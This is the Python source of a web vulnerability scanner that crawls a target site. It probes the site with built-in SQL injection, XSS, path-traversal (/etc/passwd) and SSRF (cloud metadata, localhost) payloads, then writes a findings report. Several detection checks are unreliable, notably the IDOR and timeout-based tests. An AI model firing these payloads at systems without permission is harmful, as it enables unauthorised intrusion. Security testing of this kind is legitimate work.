#!/usr/bin/env python3
"""
Web Vulnerability Scanner - All-in-One Version
For Ethical Hacking and Web Security Testing
"""

import requests
import sys
import time
import re
import os
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from queue import Queue

class WebVulnScanner:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.base_domain = urlparse(target_url).netloc
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        self.visited_urls = set()
        self.urls_to_scan = Queue()
        self.vulnerabilities = []
        self.lock = threading.Lock()
        
        # SQL Injection payloads
        self.sqli_payloads = [
            "'", "\"", "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
            "' UNION SELECT null--", "1' AND SLEEP(2)--", "admin'--",
            "' OR 'a'='a", "' OR 1=1; --", "' OR '1'='1' /*", "' OR '1'='1' --",
            "' UNION SELECT 1,2,3--", "' UNION SELECT null,version()--"
        ]
        
        # XSS payloads
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<svg/onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "';alert('XSS');//",
            "\" onmouseover=\"alert('XSS')\"",
            "<iframe src=javascript:alert('XSS')>"
        ]
        
        # LFI payloads
        self.lfi_payloads = [
            "../../../../etc/passwd",
            "....//....//etc/passwd",
            "/etc/passwd",
            "../../../../windows/win.ini",
            "C:\\windows\\win.ini",
            "file:///etc/passwd",
            "/etc/passwd%00",
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        ]
        
        # SSRF payloads
        self.ssrf_payloads = [
            "http://169.254.169.254/",
            "http://localhost/",
            "http://127.0.0.1/",
            "http://0.0.0.0/",
            "http://internal.local/",
            "dict://localhost:11211/stat",
            "gopher://localhost:80/_test",
            "ldap://localhost:389"
        ]
        
        # SQL error patterns
        self.sql_errors = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"ORA-[0-9]{5}",
            r"Oracle error",
            r"Oracle.*Driver",
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException",
            r"Warning.*sqlite_.*",
            r"SQLite3::",
            r"Unclosed quotation mark",
            r"Microsoft OLE DB Provider for ODBC Drivers",
            r"Microsoft Access Driver",
            r"Fatal error.*call to undefined function",
            r"Division by zero",
            r"Invalid parameter number"
        ]

    def print_banner(self):
        """Display scanner banner"""
        os.system('clear' if os.name == 'posix' else 'cls')
        banner = """
 __          __  _                           
 \\ \\        / / | |                          
  \\ \\  /\\  / /__| |__    ___  ___ __ _ _ __  
   \\ \\/  \\/ / _ \\ '_ \\  / __|/ __/ _` | '_ \\ 
    \\  /\\  /  __/ |_) | \\__ \\ (_| (_| | | | |
     \\/  \\/ \\___|_.__/  |___/\\___\\__,_|_| |_|
                                             
        """
        print("\033[91m" + banner + "\033[0m")
        print("\033[92m" + "=" * 60 + "\033[0m")
        print("\033[96mTool Name  : Website Vulnerability Scanner\033[0m")
        print("\033[96mTools Maker: DARK-NK\033[0m")
        print("\033[96mVersion    : 2.0\033[0m")
        print("\033[92m" + "=" * 60 + "\033[0m")
        print(f"[+] Target URL: {self.target_url}")
        print(f"[+] Start Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print("-" * 60)

    def crawl_site(self, url=None):
        """Crawl site to collect all URLs"""
        if url is None:
            url = self.target_url
        
        if url in self.visited_urls:
            return []
        
        self.visited_urls.add(url)
        
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract all links
            links = []
            for tag in soup.find_all(['a', 'link', 'script', 'img', 'form']):
                href = None
                if tag.name == 'a' and tag.get('href'):
                    href = tag['href']
                elif tag.name == 'link' and tag.get('href'):
                    href = tag['href']
                elif tag.name == 'script' and tag.get('src'):
                    href = tag['src']
                elif tag.name == 'img' and tag.get('src'):
                    href = tag['src']
                elif tag.name == 'form' and tag.get('action'):
                    href = tag['action']
                
                if href:
                    # Build absolute URL
                    full_url = urljoin(url, href)
                    
                    # Only follow links from same domain
                    if self.base_domain in full_url and full_url not in self.visited_urls:
                        links.append(full_url)
                        self.urls_to_scan.put(full_url)
            
            return links
            
        except Exception as e:
            print(f"[-] Crawling error {url}: {str(e)[:50]}")
            return []

    def scan_sqli(self, url):
        """Scan for SQL Injection"""
        if '?' not in url:
            return None
        
        url_parts = url.split('?')
        base = url_parts[0]
        query_string = url_parts[1]
        
        params = query_string.split('&')
        for param in params:
            try:
                key = param.split('=')[0]
                original_value = '='.join(param.split('=')[1:])
                
                for payload in self.sqli_payloads:
                    test_value = original_value + payload
                    test_url = f"{base}?{key}={test_value}"
                    
                    try:
                        response = self.session.get(test_url, timeout=5)
                        
                        # Check for SQL errors
                        for error_pattern in self.sql_errors:
                            if re.search(error_pattern, response.text, re.IGNORECASE):
                                return {
                                    'type': 'SQL Injection',
                                    'url': test_url,
                                    'severity': 'CRITICAL',
                                    'details': f'SQL error detected with payload: {payload}',
                                    'parameter': key,
                                    'payload': payload
                                }
                        
                        # Time-based SQLi detection
                        if 'SLEEP' in payload or 'sleep' in payload:
                            start_time = time.time()
                            self.session.get(test_url, timeout=10)
                            elapsed = time.time() - start_time
                            if elapsed > 1.5:  # If takes more than 1.5 seconds
                                return {
                                    'type': 'SQL Injection (Time-based)',
                                    'url': test_url,
                                    'severity': 'HIGH',
                                    'details': f'Time delay detected: {elapsed:.2f} seconds',
                                    'parameter': key,
                                    'payload': payload
                                }
                                
                    except requests.exceptions.Timeout:
                        if 'SLEEP' in payload or 'sleep' in payload:
                            return {
                                'type': 'SQL Injection (Potential Time-based)',
                                'url': test_url,
                                'severity': 'MEDIUM',
                                'details': 'Request timeout - possible SQL injection',
                                'parameter': key,
                                'payload': payload
                            }
                    except:
                        continue
                        
            except:
                continue
        
        return None

    def scan_xss(self, url):
        """Scan for XSS vulnerabilities"""
        try:
            response = self.session.get(url, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find forms
            forms = soup.find_all('form')
            for form in forms:
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                
                # Find input fields
                inputs = form.find_all('input')
                for payload in self.xss_payloads:
                    test_data = {}
                    for inp in inputs:
                        name = inp.get('name')
                        if name:
                            test_data[name] = payload
                    
                    if not test_data:
                        continue
                    
                    # Build form URL
                    if form_action.startswith('http'):
                        form_url = form_action
                    else:
                        form_url = urljoin(url, form_action)
                    
                    # Send request
                    if form_method == 'post':
                        resp = self.session.post(form_url, data=test_data, timeout=5)
                    else:
                        resp = self.session.get(form_url, params=test_data, timeout=5)
                    
                    # Check if payload is reflected
                    if payload in resp.text:
                        return {
                            'type': 'Cross-Site Scripting (XSS)',
                            'url': form_url,
                            'severity': 'HIGH',
                            'details': f'XSS payload reflected in response',
                            'parameter': 'Form inputs',
                            'payload': payload
                        }
            
            # Also check URL parameters
            if '?' in url:
                url_parts = url.split('?')
                base = url_parts[0]
                query = url_parts[1]
                
                params = query.split('&')
                for param in params:
                    key = param.split('=')[0]
                    for payload in self.xss_payloads:
                        test_url = f"{base}?{key}={payload}"
                        resp = self.session.get(test_url, timeout=5)
                        
                        if payload in resp.text:
                            return {
                                'type': 'XSS (Reflected)',
                                'url': test_url,
                                'severity': 'HIGH',
                                'details': 'XSS payload reflected in URL parameter',
                                'parameter': key,
                                'payload': payload
                            }
                            
        except Exception as e:
            pass
        
        return None

    def scan_lfi(self, url):
        """Scan for Local File Inclusion"""
        if '?' not in url:
            return None
        
        url_parts = url.split('?')
        base = url_parts[0]
        query = url_parts[1]
        
        params = query.split('&')
        for param in params:
            key = param.split('=')[0]
            
            for payload in self.lfi_payloads:
                test_url = f"{base}?{key}={payload}"
                
                try:
                    response = self.session.get(test_url, timeout=5)
                    
                    # LFI success indicators
                    lfi_indicators = [
                        'root:x:0:0',
                        'daemon:x:1:1',
                        'bin:x:2:2',
                        '[boot loader]',
                        '[fonts]',
                        '[extensions]',
                        'administrator:500',
                        'SYSTEM.*COMPUTERNAME',
                        'windows directory'
                    ]
                    
                    for indicator in lfi_indicators:
                        if indicator in response.text:
                            return {
                                'type': 'Local File Inclusion (LFI)',
                                'url': test_url,
                                'severity': 'CRITICAL',
                                'details': f'File inclusion successful: {indicator[:30]}...',
                                'parameter': key,
                                'payload': payload
                            }
                            
                except:
                    continue
        
        return None

    def scan_csrf(self, url):
        """Scan for CSRF vulnerabilities"""
        try:
            response = self.session.get(url, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            for form in forms:
                # Check for CSRF tokens
                has_csrf = False
                
                # Check input fields
                inputs = form.find_all('input', {'type': 'hidden'})
                for inp in inputs:
                    name = inp.get('name', '').lower()
                    if 'csrf' in name or 'token' in name or 'nonce' in name or 'authenticity' in name:
                        has_csrf = True
                        break
                
                if not has_csrf:
                    form_action = form.get('action', '')
                    form_method = form.get('method', 'get').upper()
                    
                    # Critical actions (login, password change, etc.)
                    critical_actions = ['login', 'register', 'password', 'delete', 'update', 'admin', 'edit', 'add', 'create']
                    is_critical = any(action in form_action.lower() for action in critical_actions)
                    
                    severity = 'HIGH' if is_critical else 'MEDIUM'
                    
                    return {
                        'type': 'Cross-Site Request Forgery (CSRF)',
                        'url': url,
                        'severity': severity,
                        'details': f'Form at {url} lacks CSRF protection (Action: {form_action}, Method: {form_method})',
                        'parameter': 'Form',
                        'payload': None
                    }
                    
        except Exception as e:
            pass
        
        return None

    def scan_ssrf(self, url):
        """Scan for Server-Side Request Forgery"""
        if '?' not in url:
            return None
        
        url_parts = url.split('?')
        base = url_parts[0]
        query = url_parts[1]
        
        params = query.split('&')
        for param in params:
            key = param.split('=')[0]
            
            for payload in self.ssrf_payloads:
                test_url = f"{base}?{key}={payload}"
                
                try:
                    response = self.session.get(test_url, timeout=3)
                    
                    # SSRF success indicators
                    ssrf_indicators = [
                        'ami-id',
                        'instance-id',
                        'public-keys',
                        'local-ipv4',
                        'localhost',
                        'internal',
                        'metadata',
                        '169.254.169.254',
                        '127.0.0.1'
                    ]
                    
                    for indicator in ssrf_indicators:
                        if indicator in response.text.lower():
                            return {
                                'type': 'Server-Side Request Forgery (SSRF)',
                                'url': test_url,
                                'severity': 'CRITICAL',
                                'details': f'SSRF successful - accessed internal resource: {indicator}',
                                'parameter': key,
                                'payload': payload
                            }
                            
                except requests.exceptions.Timeout:
                    # Timeout could indicate SSRF
                    return {
                        'type': 'Potential SSRF (Timeout)',
                        'url': test_url,
                        'severity': 'MEDIUM',
                        'details': 'Request timeout - might indicate SSRF vulnerability',
                        'parameter': key,
                        'payload': payload
                    }
                except:
                    continue
        
        return None

    def scan_idor(self, url):
        """Scan for Insecure Direct Object Reference"""
        try:
            # Look for numeric IDs in URL
            numeric_patterns = [
                r'id=(\d+)',
                r'user=(\d+)',
                r'uid=(\d+)',
                r'file=(\d+)',
                r'doc=(\d+)'
            ]
            
            for pattern in numeric_patterns:
                match = re.search(pattern, url)
                if match:
                    numeric_id = match.group(1)
                    # Test with different ID
                    test_id = str(int(numeric_id) + 100)
                    test_url = url.replace(f"{numeric_id}", test_id)
                    
                    response = self.session.get(test_url, timeout=5)
                    original_response = self.session.get(url, timeout=5)
                    
                    # If different ID returns same/similar content
                    if response.status_code == 200 and response.text != original_response.text:
                        return {
                            'type': 'Insecure Direct Object Reference (IDOR)',
                            'url': test_url,
                            'severity': 'HIGH',
                            'details': f'Access control bypass possible with ID: {test_id}',
                            'parameter': 'ID parameter',
                            'payload': test_id
                        }
        
        except:
            pass
        
        return None

    def scan_url(self, url):
        """Run all tests for a single URL"""
        results = []
        
        # Only scan GET request URLs with parameters
        if '?' in url:
            # SQL Injection scan
            sqli_result = self.scan_sqli(url)
            if sqli_result:
                results.append(sqli_result)
            
            # XSS scan
            xss_result = self.scan_xss(url)
            if xss_result:
                results.append(xss_result)
            
            # LFI scan
            lfi_result = self.scan_lfi(url)
            if lfi_result:
                results.append(lfi_result)
            
            # SSRF scan
            ssrf_result = self.scan_ssrf(url)
            if ssrf_result:
                results.append(ssrf_result)
            
            # IDOR scan
            idor_result = self.scan_idor(url)
            if idor_result:
                results.append(idor_result)
        
        # CSRF scan (for all pages)
        csrf_result = self.scan_csrf(url)
        if csrf_result:
            results.append(csrf_result)
        
        return results

    def start_crawling(self):
        """Start full site crawling"""
        print("[+] Starting site crawling...")
        
        # First crawl main page
        self.crawl_site(self.target_url)
        self.urls_to_scan.put(self.target_url)
        
        # Find more URLs
        max_pages = 50  # Maximum 50 pages to scan
        crawled_count = 0
        
        while not self.urls_to_scan.empty() and crawled_count < max_pages:
            url = self.urls_to_scan.get()
            
            if url not in self.visited_urls:
                try:
                    new_links = self.crawl_site(url)
                    crawled_count += 1
                    
                    if crawled_count % 10 == 0:
                        print(f"[+] Crawled {crawled_count} pages...")
                        
                except Exception as e:
                    print(f"[-] Error crawling {url}: {str(e)[:50]}")
        
        print(f"[+] Crawling complete! Found {len(self.visited_urls)} URLs")

    def start_scanning(self):
        """Start full scanning process"""
        print("[+] Starting vulnerability scanning...")
        print("[+] Checking each URL for vulnerabilities...")
        
        total_urls = len(self.visited_urls)
        current = 0
        
        # Multi-threaded scanning
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {}
            for url in self.visited_urls:
                future = executor.submit(self.scan_url, url)
                futures[future] = url
            
            for future in as_completed(futures):
                url = futures[future]
                current += 1
                
                # Progress bar
                progress = (current / total_urls) * 100
                print(f"\r[+] Scanning: {current}/{total_urls} ({progress:.1f}%)", end='', flush=True)
                
                try:
                    results = future.result()
                    if results:
                        with self.lock:
                            self.vulnerabilities.extend(results)
                except Exception as e:
                    print(f"\n[-] Scan error {url}: {str(e)[:50]}")
        
        print("\n[+] Scanning complete!")

    def generate_report(self):
        """Generate and save report"""
        if not self.vulnerabilities:
            print("[+] No vulnerabilities found!")
            return
        
        print(f"\n[+] Found {len(self.vulnerabilities)} vulnerabilities!")
        print("-" * 60)
        
        # Report file name
        domain = self.base_domain.replace('.', '_')
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        report_file = f"scan_report_{domain}_{timestamp}.txt"
        
        # Write report
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write("WEB VULNERABILITY SCAN REPORT\n")
            f.write("=" * 60 + "\n\n")
            
            f.write(f"Target URL: {self.target_url}\n")
            f.write(f"Scan Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total Vulnerabilities: {len(self.vulnerabilities)}\n")
            f.write("-" * 60 + "\n\n")
            
            # Sort by severity
            severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
            sorted_vulns = sorted(self.vulnerabilities, key=lambda x: severity_order.get(x['severity'], 4))
            
            # Write each vulnerability
            for i, vuln in enumerate(sorted_vulns, 1):
                f.write(f"{i}. Vulnerability Type: {vuln['type']}\n")
                f.write(f"   Severity: {vuln['severity']}\n")
                f.write(f"   URL: {vuln['url']}\n")
                f.write(f"   Parameter: {vuln.get('parameter', 'N/A')}\n")
                f.write(f"   Details: {vuln['details']}\n")
                if vuln.get('payload'):
                    f.write(f"   Payload: {vuln['payload']}\n")
                f.write("-" * 50 + "\n")
            
            # Summary
            f.write("\n" + "=" * 60 + "\n")
            f.write("SUMMARY:\n")
            f.write("=" * 60 + "\n")
            
            severity_counts = {}
            for vuln in self.vulnerabilities:
                sev = vuln['severity']
                severity_counts[sev] = severity_counts.get(sev, 0) + 1
            
            for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
                count = severity_counts.get(sev, 0)
                f.write(f"{sev}: {count}\n")
            
            f.write("\n" + "=" * 60 + "\n")
            f.write("RECOMMENDATIONS:\n")
            f.write("=" * 60 + "\n")
            f.write("1. Use prepared statements for all SQL queries\n")
            f.write("2. Validate and sanitize all user inputs\n")
            f.write("3. Implement CSRF tokens on all forms\n")
            f.write("4. Enable strict file upload validation\n")
            f.write("5. Implement proper access controls\n")
            f.write("6. Use Content Security Policy (CSP) headers\n")
            f.write("7. Regular security testing and code reviews\n")
            f.write("8. Keep all software updated\n")
        
        print(f"[+] Report saved: {report_file}")
        
        # Display summary in terminal
        self.display_summary()

    def display_summary(self):
        """Display summary in terminal"""
        print("\n" + "=" * 60)
        print("SCAN REPORT SUMMARY:")
        print("=" * 60)
        
        severity_counts = {}
        type_counts = {}
        
        for vuln in self.vulnerabilities:
            # Count by severity
            sev = vuln['severity']
            severity_counts[sev] = severity_counts.get(sev, 0) + 1
            
            # Count by type
            typ = vuln['type']
            type_counts[typ] = type_counts.get(typ, 0) + 1
        
        print("\nBy Severity:")
        for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
            count = severity_counts.get(sev, 0)
            color = '\033[91m' if sev in ['CRITICAL', 'HIGH'] else '\033[93m' if sev == 'MEDIUM' else '\033[92m'
            print(f"  {color}{sev}: {count}\033[0m")
        
        print("\nBy Vulnerability Type:")
        for typ, count in type_counts.items():
            print(f"  {typ}: {count}")
        
        print("\n" + "=" * 60)
        
        # Show some important vulnerabilities
        if self.vulnerabilities:
            print("\nTop Vulnerabilities Found:")
            critical_vulns = [v for v in self.vulnerabilities if v['severity'] in ['CRITICAL', 'HIGH']]
            for i, vuln in enumerate(critical_vulns[:5], 1):
                print(f"{i}. {vuln['type']} - {vuln['severity']}")
                print(f"   URL: {vuln['url'][:80]}...")
                print()

    def run_full_scan(self):
        """Run complete scan process"""
        self.print_banner()
        
        # Check target
        try:
            response = self.session.get(self.target_url, timeout=10)
            if response.status_code != 200:
                print(f"[-] Warning: Target returned status code {response.status_code}")
        except Exception as e:
            print(f"[-] Error: Cannot connect to target: {str(e)}")
            return
        
        # Crawling
        self.start_crawling()
        
        # Scanning
        self.start_scanning()
        
        # Generate report
        self.generate_report()
        
        print("\n[+] Scan completed successfully!")
        print(f"[+] Scan time: {time.strftime('%M minutes %S seconds')}")

def main():
    """Main function"""
    
    # User input
    if len(sys.argv) == 2:
        target_url = sys.argv[1]
    else:
        print("\n" + "=" * 60)
        print("WEBSITE VULNERABILITY SCANNER")
        print("=" * 60)
        target_url = input("\nEnter target URL (e.g., http://example.com): ").strip()
    
    # URL validation
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    print(f"\n[+] Starting scan for: {target_url}")
    print("[+] Please wait...\n")
    
    # Start scanner
    scanner = WebVulnScanner(target_url)
    scanner.run_full_scan()
    
    print("\n" + "=" * 60)
    print("Thank you for using Website Vulnerability Scanner!")
    print("=" * 60)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[-] Scan cancelled by user!")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Error: {str(e)}")

        sys.exit(1)
